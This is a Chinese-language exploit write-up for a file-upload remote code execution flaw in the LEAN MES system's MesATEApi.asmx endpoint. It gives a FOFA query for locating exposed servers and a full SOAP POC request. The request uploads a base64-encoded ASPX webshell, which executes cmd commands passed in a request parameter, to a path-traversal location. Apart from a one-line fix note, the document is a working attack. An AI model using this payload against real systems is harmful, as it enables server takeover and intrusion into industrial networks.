# 深科特LEAN MES系统 MesATEApi.asmx 文件上传RCE漏洞

深科特LEAN MES系统 MesATEApi.asmx 文件上传RCE漏洞，攻击者可通过上传恶意文件导致服务器被控制。

# 影响版本

深科特LEAN MES系统 

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"

POC/EXP：

```
POST /WebService/MesATEApi.asmx HTTP/1.1
Host: 127.0.0.1
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://mesateapi.com/UploadFileToMES"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <UploadFileToMES xmlns="http://mesateapi.com/">
      <empNo>string</empNo>
      <sn>string</sn>
      <resource>string</resource>
      <station>string</station>
      <fileBytes>PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiIHZhbGlkYXRlUmVxdWVzdD0iZmFsc2UiICU+CjwlCnZhciBjPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbygiY21kIik7CnZhciBlPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcygpOwp2YXIgb3V0OlN5c3RlbS5JTy5TdHJlYW1SZWFkZXIsRUk6U3lzdGVtLklPLlN0cmVhbVJlYWRlcjsKYy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7CmMuUmVkaXJlY3RTdGFuZGFyZE91dHB1dD10cnVlOwpjLlJlZGlyZWN0U3RhbmRhcmRFcnJvcj10cnVlOwplLlN0YXJ0SW5mbz1jOwpjLkFyZ3VtZW50cz0iL2MgIiArIFJlcXVlc3QuSXRlbVsiY21kIl07CmUuU3RhcnQoKTsKb3V0PWUuU3RhbmRhcmRPdXRwdXQ7CkVJPWUuU3RhbmRhcmRFcnJvcjsKZS5DbG9zZSgpOwpSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkgKyBFSS5SZWFkVG9FbmQoKSk7ClN5c3RlbS5JTy5GaWxlLkRlbGV0ZShSZXF1ZXN0LlBoeXNpY2FsUGF0aCk7ClJlc3BvbnNlLkVuZCgpOyU+</fileBytes>
      <folderName>/../ertyui</folderName>
      <fileName>rce.aspx</fileName>
    </UploadFileToMES>
  </soap:Body>
</soap:Envelope>
```

![image-20260113170721267](assets/image-20260113170721267.png)

![image-20260113170805804](assets/image-20260113170805804.png)



```

```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
